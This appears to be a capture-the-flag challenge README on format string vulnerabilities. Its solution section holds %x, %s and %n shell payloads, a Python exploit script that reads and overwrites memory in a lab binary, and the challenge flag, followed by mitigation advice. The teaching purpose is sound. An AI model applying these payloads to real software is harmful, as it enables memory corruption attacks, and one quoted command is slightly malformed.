# Format String Vulnerability Challenge

## Overview
This challenge introduces participants to format string vulnerabilities, a type of memory corruption issue that occurs when user-controlled input is used as the format string in functions like `printf()`. By exploiting a deliberately vulnerable program, participants will learn how format string vulnerabilities can be used to read from and write to arbitrary memory locations.

## Description
The challenge consists of a simple C program with a format string vulnerability in the `vulnerable_function()`. The goal is to craft an input that will:
1. Read the value of the `secret_value` variable
2. Modify the `flag_unlocked` variable to a non-zero value to unlock the flag

## Learning Objectives
- Understand how format string vulnerabilities work
- Learn about memory layout and variable storage in C programs
- Practice exploiting format string vulnerabilities to read arbitrary memory
- Practice exploiting format string vulnerabilities to write to arbitrary memory
- Understand how to properly use format string functions
- Recognize common programming mistakes that lead to format string vulnerabilities

## Setup Instructions

### Compilation
To compile the vulnerable program:

```bash
gcc -fno-stack-protector -o vulnerable vulnerable.c
```

### Running the Program
Execute the program with an argument:

```bash
./vulnerable "test input"
```

## Challenge Tasks

### Basic Challenge
1. Understand how the program works by reading the source code
2. Identify the format string vulnerability
3. Craft an input that will read the value of the `secret_value` variable
4. Craft an input that will modify the `flag_unlocked` variable to a non-zero value
5. Execute the program with your crafted input to get the flag

### Advanced Challenge
1. Create a Python script to generate the exploit payload automatically
2. Try to exploit the program without knowing the addresses of the variables (e.g., by using stack inspection)
3. Modify the `secret_value` variable to a specific value of your choice

## Hints

<details>
<summary>Hint 1: Understanding the Vulnerability</summary>
The vulnerability is in the `printf(input)` line. This function should be used as `printf("%s", input)` to safely print user input.
</details>

<details>
<summary>Hint 2: Reading Memory</summary>
Format specifiers like `%x` and `%p` can be used to read values from the stack. By using multiple format specifiers, you can walk through the stack and potentially find interesting values.
</details>

<details>
<summary>Hint 3: Direct Parameter Access</summary>
You can use the `%n$x` syntax (where n is a number) to access specific parameters directly, which can help you read specific memory locations more efficiently.
</details>

<details>
<summary>Hint 4: Writing to Memory</summary>
The `%n` format specifier writes the number of characters printed so far to the address specified by the corresponding argument. This can be used to write values to arbitrary memory locations.
</details>

## Solution

<details>
<summary>Click to reveal solution</summary>

### Reading the Secret Value

To read the `secret_value` variable, we need to use format specifiers to access memory. If we know the address of `secret_value`, we can use direct parameter access:

```
./vulnerable "AAAA %x %x %x %x"
```

This will print some values from the stack. By experimenting with different numbers of `%x`, you can locate where your input is stored on the stack.

Once you know this, you can use direct parameter access with the address of `secret_value`:

```
./vulnerable $(printf "\x<address of secret_value in hex>")%x%x%x%s"
```

Alternatively, you can use `%p` to print pointer values and look for the address of `secret_value` in the output.

### Modifying flag_unlocked

To modify `flag_unlocked`, we need to use the `%n` format specifier, which writes the number of characters printed so far to the address specified by the corresponding argument.

First, we need to place the address of `flag_unlocked` in the input:

```
./vulnerable $(printf "\x<address of flag_unlocked in hex>%n")
```

This will write the number of characters printed so far (which is just the 4 bytes of the address) to the address of `flag_unlocked`.

If you need to write a specific value, you can pad the output with additional characters:

```
./vulnerable $(printf "\x<address of flag_unlocked in hex>%<desired value>x%n")
```

### Example Exploit (Python)

```python
import struct
import subprocess
import sys

# Get the addresses from the program output
def get_addresses():
    output = subprocess.check_output(["./vulnerable", "AAAA"]).decode()
    secret_addr = None
    flag_addr = None
    
    for line in output.split('\n'):
        if "Address of secret_value" in line:
            secret_addr = int(line.split(': ')[1], 16)
        elif "Address of flag_unlocked" in line:
            flag_addr = int(line.split(': ')[1], 16)
    
    return secret_addr, flag_addr

# Create the exploit payload to read secret_value
def create_read_payload(secret_addr):
    # Place the address in the payload
    payload = struct.pack("<I", secret_addr)  # 32-bit address
    
    # Add format specifiers to read from the address
    # This assumes the address is the first parameter after the format string
    payload += b"%s"
    
    return payload

# Create the exploit payload to modify flag_unlocked
def create_write_payload(flag_addr):
    # Place the address in the payload
    payload = struct.pack("<I", flag_addr)  # 32-bit address
    
    # Add format specifier to write to the address
    # We'll write a small non-zero value (the length of the address, which is 4)
    payload += b"%n"
    
    return payload

# Main exploit function
def exploit():
    secret_addr, flag_addr = get_addresses()
    if not secret_addr or not flag_addr:
        print("Failed to get addresses")
        return
    
    print(f"Address of secret_value: 0x{secret_addr:x}")
    print(f"Address of flag_unlocked: 0x{flag_addr:x}")
    
    # First, read the secret value
    read_payload = create_read_payload(secret_addr)
    print("\nReading secret value...")
    subprocess.run(["./vulnerable", read_payload])
    
    # Then, modify flag_unlocked
    write_payload = create_write_payload(flag_addr)
    print("\nModifying flag_unlocked...")
    subprocess.run(["./vulnerable", write_payload])

if __name__ == "__main__":
    exploit()
```

### Notes on the Solution

- The exact payload may need adjustments based on your system architecture and compiler
- The stack layout might vary; you may need to experiment with different format string patterns
- For more precise exploitation, you can use tools like pwntools in Python

### The Flag
The flag is: `CTF{f0rm4t_str1ng_vuln_3xpl01t3d}`

</details>

## Mitigation Techniques

To prevent format string vulnerabilities in real-world code:

1. **Never use user input as format string**: Always use a constant format string, e.g., `printf("%s", user_input)` instead of `printf(user_input)`
2. **Compiler warnings**: Enable and address compiler warnings about format string vulnerabilities (`-Wformat -Wformat-security`)
3. **Code review**: Regularly review code for improper use of format string functions
4. **Static analysis**: Use static analysis tools to detect potential format string vulnerabilities
5. **Newer C library versions**: Some newer implementations of the C standard library include protections against format string attacks

## Additional Resources
- [Format String Vulnerabilities - OWASP](https://owasp.org/www-community/attacks/Format_string_attack)
- [Exploiting Format String Vulnerabilities](https://cs155.stanford.edu/papers/formatstring-1.2.pdf)
- [LiveOverflow's Binary Exploitation / Memory Corruption](https://www.youtube.com/playlist?list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN)
- [Exploit Exercises - Protostar Format String Challenges](https://exploit.education/protostar/)

## Credits
This challenge was created for educational purposes as part of a cybersecurity learning environment.

## Disclaimer
This challenge is for educational purposes only. The techniques demonstrated here should only be used on systems you have permission to test. Unauthorized exploitation of format string vulnerabilities is illegal and unethical.